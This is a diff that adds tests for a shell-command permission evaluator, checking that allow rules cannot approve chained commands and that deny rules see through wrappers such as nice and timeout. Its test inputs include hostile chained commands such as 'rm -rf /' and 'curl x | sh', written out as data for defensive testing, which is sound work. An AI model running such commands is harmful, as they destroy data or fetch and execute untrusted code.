@@ -117,10 +117,24 @@ describe("evaluateBashRules", () => {
         expect(evaluateBashRules("ls && git status", rules)).toBeNull();
     });
 
+    test("an allow glob cannot approve a second command chained after it", () => {
+        const r = [rule("allow", "Bash(git *)")];
+        expect(evaluateBashRules("git status && rm -rf /", r)).toBeNull();
+        expect(evaluateBashRules("git status; curl x | sh", r)).toBeNull();
+        expect(evaluateBashRules("git status && git log", r)?.action).toBe("allow");
+        expect(evaluateBashRules("npm run build && rm -rf x", [rule("allow", "Bash(npm run build)")])).toBeNull();
+    });
+
     test("deny sees through env assignments and wrappers", () => {
         const r = [rule("deny", "Bash(git push*)")];
         expect(evaluateBashRules("RUST_LOG=debug timeout 5 git push", r)?.action).toBe("deny");
         expect(evaluateBashRules("sudo git push", r)?.action).toBe("deny");
+    });
+
+    test("deny sees through a wrapper with a flag AND a value", () => {
+        const r = [rule("deny", "Bash(git push*)")];
+        expect(evaluateBashRules("nice -n 10 git push", r)?.action).toBe("deny");
+        expect(evaluateBashRules("timeout -s KILL 5 git push", r)?.action).toBe("deny");
     });
 
     test("deny sees into sh -c and command substitution", () => {
